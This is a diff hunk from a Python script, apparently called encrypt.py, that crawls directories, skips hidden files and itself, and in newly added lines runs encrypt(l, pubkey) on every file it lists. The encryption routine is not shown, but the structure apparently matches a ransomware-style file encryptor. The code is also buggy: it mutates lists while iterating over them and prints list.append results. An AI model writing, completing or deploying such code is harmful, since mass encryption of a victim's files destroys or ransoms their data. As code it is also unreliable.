@@ -106,6 +106,8 @@ for i in directory:
             print(files)
             print(directory)
         #NEXT
+            for l in files:
+                encrypt(l, pubkey)
             for l in directory:
                 os.chdir(l)
                 array = os.listdir()
@@ -120,9 +122,9 @@ for i in directory:
                             array.remove("encrypt.py")
                     else:
                         print(directory.append(l))
-                for f in directory:
-                    if f.startswith('.'):
-                        directory.remove(f)
+                for l in directory:
+                    if l.startswith('.'):
+                        directory.remove(l)
                         print("one file removed")
                 print(files)
                 print(directory)
@@ -142,9 +144,9 @@ for i in directory:
                                 array.remove("encrypt.py")
                         else:
                             print(directory.append(i))
-                    for f in directory:
-                        if f.startswith('.'):
-                            directory.remove(f)
+                    for m in directory:
+                        if m.startswith('.'):
+                            directory.remove(m)
                             print("one file removed")
                     print(files)
                     print(directory)
@@ -164,9 +166,9 @@ for i in directory:
                                     array.remove("encrypt.py")
                             else:
                                 print(directory.append(i))
-                        for f in directory:
-                            if f.startswith('.'):
-                                directory.remove(f)
+                        for n in directory:
+                            if n.startswith('.'):
+                                directory.remove(n)
                                 print("one file removed")
                         print(files)
                         print(directory)
